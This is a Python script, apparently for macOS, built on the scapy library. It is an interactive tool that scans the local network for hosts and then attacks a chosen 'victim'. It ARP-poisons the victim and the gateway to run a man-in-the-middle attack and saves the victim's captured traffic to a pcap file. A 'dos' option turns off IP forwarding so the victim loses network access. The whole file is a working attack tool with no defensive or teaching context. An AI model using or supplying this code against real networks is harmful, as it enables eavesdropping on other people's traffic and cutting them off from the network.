from scapy.all import *
import os
import signal
import sys
import threading
import time
import subprocess
import socket

self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
lan = self_ip.split(".")
lan = lan[0] + "." + lan[1] + "." + lan[2]
nmap_broadcast = lan + ".1/24"
gateway_ip = str(subprocess.check_output("route get default | grep gateway | cut -f 2 -d \":\"", shell=True))[3:-3]
gateway_mac = ""
packet_count = 1000
hosts = dict()
online_hosts = dict()

def get_online_hosts_with_mac():
	print("finding all the hosts with mac addresses in the lan")
	global nmap_broadcast
	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
	arp_result = subprocess.check_output("arp -a", shell=True)
	if arp_result == "":
		print("no online hosts were find or internet connection is lost")
		return
	arp_result = arp_result.decode().split('\n')
	del arp_result[-1]
	for host in arp_result:
		host = host.split(" ")
		if host[3] == "(incomplete)":
			continue
		global hosts
		hosts[host[1][1:-1]] = host[3]
		global gateway_ip
		global gateway_mac
		if host[1][1:-1] == gateway_ip:
			gateway_mac = host[3]
	

def get_online_hosts():
	print("finding all the hosts with mac addresses in the lan")
	global nmap_broadcast
	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
	arp_result = subprocess.check_output("arp -a", shell=True)
	if arp_result == "":
		print("no online hosts were find or internet connection is lost")
		return
	arp_result = arp_result.decode().split('\n')
	del arp_result[-1]
	global online_hosts
	for host in arp_result:
		host = host.split(" ")
		online_hosts[host[1][1:-1]] = host[3]
	

def arp_poison(target_ip):
	global gateway_mac, gateway_ip
	if gateway_ip == "" or gateway_mac == "":
		get_online_hosts_with_mac()
	print("starting the mitm attack")
	try:
		while True:
			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
			time.sleep(2)
	except KeyboardInterrupt:
		print("restoring network")
		restore()
	except Exception as e:
		print(e)

def mitm_callback(pkt):
	pkt.show()

def starvation_callback(pkt):
	pkt.show()

def enable_forwarding():
	os.system("sudo sysctl -w net.inet.ip.forwarding=1")
	
def disable_forwarding():
	os.system("sudo sysctl -w net.inet.ip.forwarding=0")

def restore():
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=hosts[target_ip], psrc=target_ip), count=5, verbose=False)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5, verbose=False)
        #disable_forwarding()
        enable_forwarding()


while 1:
	print("select from below options")
	print("1 get online hosts with mac addresses")
	print("2 mitm")
	print("3 dos")
	option = input()
	

	if option == "1":
		get_online_hosts_with_mac()
		for key, value in hosts.items():
			if key == gateway_ip and value == gateway_mac:
				print(key + " at " + value + " as gateway")
				continue
			try:
				print(key + " at " + value + " " + socket.gethostbyaddr(key))
			except Exception as e:
				print(key + " at " + value)

		print()
	
	elif option == "2":
		print("enter the ip of the victim")
		target_ip = input()
		if target_ip == self_ip:
			print("cannot attack yourself")
			print()
			continue
		else:
			try:
				enable_forwarding()
				poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
				poison_thread.start()
				sniff_filter = "ip host " + target_ip
				print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
				packets = sniff(filter=sniff_filter, prn=mitm_callback, iface="en0")
				#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
				wrpcap(target_ip + "_capture.pcap", packets)
			except KeyboardInterrupt:
				print("restoring network")
				restore()
		print("restoring network")
		restore()

	
	elif option == "3":
		print("enter the ip of the victim")
		target_ip = input()
		if target_ip == self_ip:
			print("cannot attack yourself")
			print()
			continue
		else:
			try:
				disable_forwarding()
				poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
				poison_thread.start()
				sniff_filter = "ip host " + target_ip
				print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
				packets = sniff(filter=sniff_filter, prn=mitm_callback, iface="en0")
				#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
				wrpcap(target_ip + "_capture.pcap", packets)
			except KeyboardInterrupt:
				print("restoring network")
				restore()
		print("restoring network")
		restore()
	
